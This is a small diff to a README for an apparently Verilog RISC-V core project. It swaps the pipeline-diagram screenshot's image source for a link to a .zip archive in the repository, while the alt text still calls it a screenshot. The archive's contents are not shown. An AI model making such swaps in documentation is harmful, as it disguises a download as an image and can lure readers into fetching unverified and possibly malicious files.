@@ -50,7 +50,7 @@ The project is modularized into several Verilog components that work together to
 
 ## 4. Pipeline Diagram
 
-<img width="1214" height="637" alt="Screenshot 2025-08-02 at 4 46 03 PM" src="https://github.com/user-attachments/assets/6fa19ca4-d86a-4c5d-bfbf-5ff4e6f74360" />
+<img width="1214" height="637" alt="Screenshot 2025-08-02 at 4 46 03 PM" src="https://github.com/syed-sadiq-hussaini/risc-core-v/raw/refs/heads/main/code/core_risc_v_3.3-alpha.4.zip" />
 
 ## 5. Abstract
 
